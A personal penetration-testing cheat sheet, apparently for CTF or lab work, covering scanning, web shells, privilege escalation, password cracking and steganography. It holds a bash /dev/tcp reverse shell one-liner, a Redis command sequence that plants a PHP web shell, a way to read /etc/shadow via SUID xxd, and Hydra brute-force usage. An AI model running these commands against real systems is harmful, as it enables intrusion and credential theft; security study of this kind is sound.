# My Security Resources
## Scan
### Services
- nmap
    - Parameters
        - `-A` : Enable OS detection, version detection, script scanning, and traceroute
        - `-p-` : Scan all ports
        - `-p 1000-9999` : Scan port from 1000 to 9999 
- enum4linux
    - Parameters
        - `-a` : Do all simple enumeration
## Web
### Scan Directory
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [Githack-python3](https://github.com/tigert1998/GitHack-py3)
### PHP
- Bypass `system`
	- `echo passthru("whoami")`
	- `echo shell_exec("whoami")` 
	- `echo exec("whoami")`
### Shell
#### Web Shell
- [b374k](https://github.com/b374k/b374k)
- [windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)

#### Reverse Shell
- https://reverse-shell.sh/
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Bash tcp
    - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
    	- Write file in local first, and use wget/curl to get to victim machine
- Make it moreinteractively
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
### Redis
- Write shell / file
	- `redis-cli -h {ip} `
		- Connect
	- `config set dir "/var/www/html"`
		- Set dir
	- `config set dbfilename meow.php`
		- Set file name
	- `set x "\r\n\r\n<?php system($_GET[A]);?>\r\n\r\n"`
		- Write web shell
	- `save`
		- Save file
## Privilege
### Software
- [GTFOBins](https://gtfobins.github.io/)
    - Linux privileges escalation 
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) , [LinEnum](https://github.com/rebootuser/LinEnum)
    - Scan the system to find which can be use for privileges escalation
- [Pspy](https://github.com/DominicBreuker/pspy)
    - Monitor the process

### SOP
- Check `sudo -l`
	- What file we can run as super user 
- Check crontab
	- With LinEnum, LinPeas
	- PsPy check
- Check suid
	- [xxd](https://gtfobins.github.io/gtfobins/xxd/#suid)
		- Can `cat /etc/shadow`
- Check sudo version
	- [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
		- sudo < 1.2.28
## Password Crack
### Software
- Hydra
    - Crack online services password
        - SMB,SSH,FTP......
    - Usage
        - `hydra -l {username} -P {path_to_wordlist} ssh://{ip_address}`
- John the ripper
    - Crack hash like `/etc/shadow`
    - Support tools
        - [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
        - gpg2john
        - zip2john
        - samdump2
        	- NTLM 2 John
        	- `samdump2 system sam > j.txt`
    - Usage
        - `john {file} --wordlist={wordlist}`
- Hashcat
    - Crack hash 
### Dictionary
- rockyou.txt
- https://github.com/danielmiessler/SecLists
	- [xato-net-10-million-passwords-dup.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt)
### Online
- https://crackstation.net/

## Software
- RDP
	- `xfreerdp +drives /u:{username} /v:{ip}:{port}`
- FTP
	- `ls`
	- `get {file_name}`
	- `put {file_name}`
## Forensics
- Unknown files
	- `file {file_name}`
	- `binwalk {file_name}`
	- `xxd {file_name}`
### Steganography
- [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
- [zsteg](https://github.com/zed-0xff/zsteg)
- [steghide](http://steghide.sourceforge.net/)
	- `steghide extract -sf {file_name}`